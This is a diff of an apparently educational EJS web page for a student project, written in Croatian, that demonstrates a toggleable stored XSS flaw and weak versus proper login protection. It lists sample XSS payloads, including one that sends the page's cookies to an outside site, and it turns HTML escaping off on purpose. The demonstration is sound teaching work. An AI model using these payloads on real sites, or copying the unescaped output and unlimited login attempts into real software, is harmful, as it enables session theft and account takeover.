@@ -1,60 +1,137 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Welcome</title>
-</head>
-<body>
-    <h1>Hi there</h1>
+   <head>
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>Projekt 2</title>
+      <link rel="stylesheet" type="text/css" href="/css/style.css">
+   </head>
+   <body>
+    <p>Ovaj login napravljen je kako bi se podatci o korisniku spremili u cookie. Login zapravo nema nikakvu drugu svrhu. Podatci za login: username - test123, password-12345678</p>
+      <button onclick="redirectToLogin()">Login</button>
+      <div id="userInfo">
+         <% if (session && session.ime && session.prezime) { %>
+         Dobrodošli, <%= session.ime %> <%= session.prezime %>
+         <script>
+            var ime = "<%= session.ime %>"; // Dobijte korisničko ime iz sesije
+            document.cookie = "ime=" + ime + "; expires=Fri, 31 Dec 9999 23:59:59 GMT; path=/";
+         </script>
+         <% } %>
+      </div>
+      <% function escapeHTML(input, isVulnerable) {
+         if (isVulnerable) {
+             return input;
+         }
+         return input
+             .replace(/&/g, '&amp;')
+             .replace(/</g, '&lt;')
+             .replace(/>/g, '&gt;')
+             .replace(/"/g, '&quot;')
+             .replace(/'/g, '&#x27;')
+             .replace(/`/g, '&#x60');
+         } %>
+      <hr> 
+      <h3>XSS Ranjivost</h3>
+      <p>Ovdje je implementirana XSS ranjivost. Za ukljucivanje ranjivosti oznacite gumb "XSS Ranjivost". Za iskljucivanje ranjivosti, odznacite taj gumb. Implementiran je pohranjeni XSS, dakle XSS se u obliku komentara moze pohraniti u bazi, te se izvodi svakom korisniku koji dode na stranicu i oznaci gumb "XSS Ranjivost". Neki primjeri za isprobati: </p>
+      <ul>
+        <li>Obican alert: <div><%- escapeHTML("<script>alert('XSS test');</script>", false) %></div></li>
+        <li>Krada cookie-a (napomena: podatci su dostupni samo ako je korisnik ulogiran): <div><%- escapeHTML("<script>alert(document.cookie);</script>", false) %></div></li>
+        <li>Preusmjeravanje i krada cookie-a: <div><%- escapeHTML("<script>document.location.href='http://www.hr?test='+document.cookie;</script>", false) %></div></li>
 
-    <button onclick="redirectToLogin()">Login</button>
+      </ul>
+      <input type="checkbox" id="xss" name="xss" value="xss" onchange="toggleVulnerability(this)">
+      <label for="xss">XSS Ranjivost</label><br>
+      <form action="/xss" method="POST">
+         <label for="username">Ostavi komentar:</label><br>
+    <textarea id="lista" name="lista" rows="4" cols="50" required></textarea><br>
+         <input type="hidden" name="isVulnerable" value="<%= isVulnerable %>" />
+         <button type="submit">Komentiraj</button>
+      </form>
+      <script>
+         function toggleVulnerability(checkbox) {
+             isVulnerable = checkbox.checked;
+             const redirectPath = `/?isVulnerable=${isVulnerable}`;
+             window.location.href = redirectPath;
+         }
+      </script>  
+      
+      <div id="komentariList">
+         <% if (lista && lista.length > 0) { %>
+         <ul>
+            <% lista.forEach(item => { %>
+            <li>
+               <div><strong><%- escapeHTML(item.ime, isVulnerable) %></strong></div>
+               <div><%- escapeHTML(item.komentar, isVulnerable) %></div>
+            </li>
+            <% }); %>
+         </ul>
+         <% } %>
+      </div>
+      <hr>
+      <h3>Loša autentifikacija</h3>
+      <p>Ovdje je implementirana loša autentifikacija. Imamo dva sucelja za prijavu. U prvom, u slucaju lose autentifikacije, korisnik moze pogadati lozinku beskonacno puta. Takoder, poruke o pogresci ce biti lose. U drugom, onemogucit ce se pokusaj pogadanja lozinke vise od 3 puta na 5 min. Takoder, poruke o pogresci ce biti pazljivo ispisane.  </p>
 
-    <!-- Dodajte div za prikazivanje imena i prezimena -->
-        <div id="userInfo">
-  <% if (session && session.ime && session.prezime) { %>
-    Dobrodošli, <%= session.ime %> <%= session.prezime %>
-  <% } %>
-</div>
+      <h4>Losa autentifikacija</h4>
+      <form action="/brokenauth" method="POST">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" required><br>
 
-<form action="/xss" method="POST">
-        <label for="username">Dodaj u listu:</label>
-        <input type="text" id="lista" name="lista" required><br>
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required><br>
 
-        <button type="submit">Dodaj</button>
+        <button type="submit">Login</button>
     </form>
 
-    <div id="resultVariableList">
-    <% if (lista && lista.length > 0) { %>
-        <ul>
-            <% lista.forEach(item => { %>
-                <li>
-                    <div><%- item %></div>
-                </li>
-            <% }); %>
-        </ul>
+    <div id="errorBlock" style="color: red;">
+    <% if (poruka) { %>
+        <%= poruka %> 
     <% } %>
+    <!-- Ovdje će se prikazivati error poruke -->
 </div>
-<!--
-<button onclick="redirectToXSS()">Try XXS</button>
--->
-</body>
-<script>
-    function redirectToLogin() {
-        var currentPath = window.location.pathname;
 
-        if (currentPath.endsWith('/')) {
-            currentPath = currentPath.slice(0, -1);
-        }
+<h4>Ispravna autentifikacija</h4>
+      <form action="/auth" method="POST">
+        <label for="username">Username:</label>
+        <input type="text" id="username2" name="username" required><br>
 
-        var loginUrl = currentPath + "/login";
+        <label for="password">Password:</label>
+        <input type="password" id="password2" name="password" required><br>
 
-        window.location.href = loginUrl;
-    }
+        <button type="submit">Login</button>
+    </form>
 
-    function redirectToXSS() {
-    window.location.href = "/xss";
-}
+    <div id="errorBlock2" style="color: red;">
+    <% if (poruka2) { %>
+        <%= poruka2 %> 
+    <% } %>
+    <!-- Ovdje će se prikazivati error poruke -->
+</div>
+   </body>
+   <script>
+      function redirectToLogin() {
+          var currentPath = window.location.pathname;
+      
+          if (currentPath.endsWith('/')) {
+              currentPath = currentPath.slice(0, -1);
+          }
+      
+          var loginUrl = currentPath + "/login";
+      
+          window.location.href = loginUrl;
+      }
+      
+      window.addEventListener('load', (event) => {
+      const isVulnerableInput = document.querySelector('input[name="isVulnerable"]');
+      const xssCheckbox = document.getElementById("xss");
+      
+      if (isVulnerableInput) {
+          xssCheckbox.checked = isVulnerableInput.value === "true";
+      }
+      
+      });
 
-</script>
+      
+      
+      
+   </script>
 </html>
